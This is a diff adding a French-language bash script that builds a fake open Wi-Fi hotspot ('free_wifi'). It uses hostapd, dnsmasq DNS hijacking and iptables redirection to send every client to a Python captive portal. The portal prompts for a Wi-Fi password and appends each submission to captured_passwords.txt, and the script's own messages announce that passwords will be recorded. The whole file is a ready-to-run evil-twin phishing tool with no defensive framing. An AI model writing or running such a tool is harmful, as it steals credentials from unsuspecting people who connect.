@@ -1,0 +1,254 @@
+#!/bin/bash
+set -euo pipefail
+trap 'echo "[❌] Erreur sur la ligne ${LINENO}: Commande échouée avec le code de sortie $?"' ERR
+
+if [[ $EUID -ne 0 ]]; then
+    echo "[❌] Ce script doit être exécuté en tant que root."
+    exit 1
+fi
+
+check_interface() {
+    local iface="$1"
+    if ! ip link show "$iface" &>/dev/null; then
+        echo "[❌] L'interface '$iface' n'existe pas."
+        exit 1
+    fi
+}
+
+install_package() {
+    local pkg="$1"
+    if dpkg -s "$pkg" &>/dev/null; then
+        echo "[✅] $pkg est installé."
+    else
+        echo "[⚠️] $pkg n'est pas installé. Installation en cours..."
+        apt-get install -y "$pkg" || { echo "[❌] Échec de l'installation de $pkg."; exit 1; }
+        echo "[✅] $pkg installé."
+    fi
+}
+
+start_service() {
+    local service_cmd="$1"
+    local check_cmd="$2"
+    local service_name="$3"
+    echo "[ℹ️] Démarrage de $service_name..."
+    eval "$service_cmd" &
+    for i in {1..10}; do
+        sleep 1
+        if eval "$check_cmd"; then
+            echo "[✅] $service_name est actif."
+            return
+        fi
+    done
+    echo "[❌] $service_name n'a pas démarré."
+    exit 1
+}
+
+WIFI_IFACE="${WIFI_IFACE:-wlp7s0}"
+check_interface "$WIFI_IFACE"
+OUT_IFACE="${OUT_IFACE:-$(ip route | awk '/^default/{print $5; exit}')}"
+if [ -z "$OUT_IFACE" ]; then
+    echo "[❌] Impossible de détecter l'interface de sortie par défaut."
+    exit 1
+fi
+check_interface "$OUT_IFACE"
+
+echo "[ℹ️] Désactivation du contrôle de NetworkManager pour $WIFI_IFACE..."
+if command -v nmcli &>/dev/null; then
+    nmcli device set "$WIFI_IFACE" managed no || { echo "[❌] Échec de désactiver NetworkManager sur $WIFI_IFACE."; exit 1; }
+fi
+
+echo "[ℹ️] Arrêt de wpa_supplicant sur $WIFI_IFACE..."
+pkill wpa_supplicant || true
+
+echo "[ℹ️] Mise en down de $WIFI_IFACE..."
+ip link set "$WIFI_IFACE" down
+sleep 1
+ip addr flush dev "$WIFI_IFACE" || true
+
+echo "[ℹ️] Configuration de $WIFI_IFACE en mode AP (réseau ouvert)..."
+ip addr add 192.168.1.1/24 dev "$WIFI_IFACE"
+ip link set "$WIFI_IFACE" up
+
+echo "[🔍] Mise à jour des listes de paquets..."
+apt-get update -qq
+
+DEPENDENCIES=(hostapd dnsmasq iw wireless-tools python3)
+for pkg in "${DEPENDENCIES[@]}"; do
+    install_package "$pkg"
+done
+
+echo "[📡] Configuration du point d'accès Wi-Fi (réseau ouvert)..."
+cat > /etc/hostapd/hostapd.conf <<EOF
+interface=$WIFI_IFACE
+driver=nl80211
+ssid=free_wifi
+hw_mode=g
+channel=6
+EOF
+echo "[✅] Configuration hostapd créée."
+
+start_service "hostapd -B /etc/hostapd/hostapd.conf" "pgrep -x hostapd &>/dev/null" "hostapd"
+
+echo "[⚙️] Configuration de dnsmasq pour le DHCP et la redirection DNS..."
+cat > /etc/dnsmasq.conf <<EOF
+interface=$WIFI_IFACE
+bind-interfaces
+dhcp-range=192.168.1.100,192.168.1.200,12h
+dhcp-option=3,192.168.1.1
+dhcp-option=6,192.168.1.1
+address=/#/192.168.1.1
+log-queries
+log-dhcp
+EOF
+echo "[✅] Configuration dnsmasq créée."
+
+pkill dnsmasq || true
+start_service "dnsmasq -C /etc/dnsmasq.conf" "pgrep -x dnsmasq &>/dev/null" "dnsmasq"
+
+echo "[🔄] Activation du NAT..."
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A POSTROUTING -o "$OUT_IFACE" -j MASQUERADE
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+echo "[✅] NAT et redirection configurés."
+
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+PORTAL_FILE="$SCRIPT_DIR/captive.py"
+LOG_FILE="$SCRIPT_DIR/captured_passwords.txt"
+
+cat > "$PORTAL_FILE" <<'EOF'
+#!/usr/bin/env python3
+import http.server
+import socketserver
+import urllib.parse
+import os
+from datetime import datetime
+
+LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "captured_passwords.txt")
+
+class CaptiveHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-type", "text/html")
+        self.end_headers()
+        html = """<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Connexion Wi-Fi</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #f2f2f2;
+      font-family: Arial, sans-serif;
+    }
+    .container {
+      max-width: 500px;
+      margin: 50px auto;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 5px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    p {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    input[type="password"] {
+      width: 100%;
+      padding: 15px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 15px;
+      background-color: #007BFF;
+      border: none;
+      color: #fff;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    @media (max-width: 600px) {
+      .container {
+        margin: 20px;
+        padding: 15px;
+      }
+      input[type="password"], button {
+        padding: 12px;
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Connexion Wi-Fi</h2>
+    <p>Entrez votre mot de passe pour accéder à Internet :</p>
+    <form method="POST" action="">
+      <input type="password" name="password" placeholder="Mot de passe Wi-Fi" required>
+      <button type="submit">Se connecter</button>
+    </form>
+  </div>
+</body>
+</html>
+"""
+        self.wfile.write(html.encode("utf-8"))
+
+    def do_POST(self):
+        content_length = int(self.headers.get("Content-Length", 0))
+        post_data = self.rfile.read(content_length)
+        data = urllib.parse.parse_qs(post_data.decode("utf-8"))
+        password = data.get("password", [""])[0]
+        with open(LOG_FILE, "a") as f:
+            f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {password}\n")
+        self.send_response(302)
+        self.send_header("Location", "http://neverssl.com")
+        self.end_headers()
+
+if __name__ == "__main__":
+    PORT = 8080
+    with socketserver.TCPServer(("", PORT), CaptiveHandler) as httpd:
+        print("Portail captif lancé sur le port", PORT)
+        httpd.serve_forever()
+EOF
+
+chmod +x "$PORTAL_FILE"
+echo "[✅] Portail captif créé."
+
+start_service "python3 $PORTAL_FILE" "pgrep -f captive.py &>/dev/null" "Portail Captif"
+
+cleanup() {
+    echo "[🔚] Arrêt du faux Wi-Fi..."
+    pkill hostapd
+    pkill dnsmasq
+    pkill -f captive.py
+    iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
+    iptables -t nat -D POSTROUTING -o "$OUT_IFACE" -j MASQUERADE
+    ip addr flush dev "$WIFI_IFACE"
+    if command -v nmcli &>/dev/null; then
+        nmcli device set "$WIFI_IFACE" managed yes || true
+    fi
+    exit 0
+}
+trap cleanup SIGINT
+
+echo "[✅] Faux Wi-Fi 'free_wifi' activé avec portail captif sur $WIFI_IFACE."
+echo "[ℹ️] Les clients seront redirigés vers le portail et leurs mots de passe seront enregistrés dans $LOG_FILE."
+echo "[ℹ️] Si le navigateur ne s'ouvre pas automatiquement, ouvrez manuellement une page web."
+echo "[ℹ️] Appuyez sur Ctrl+C pour arrêter."
+
+while true; do sleep 1; done
+
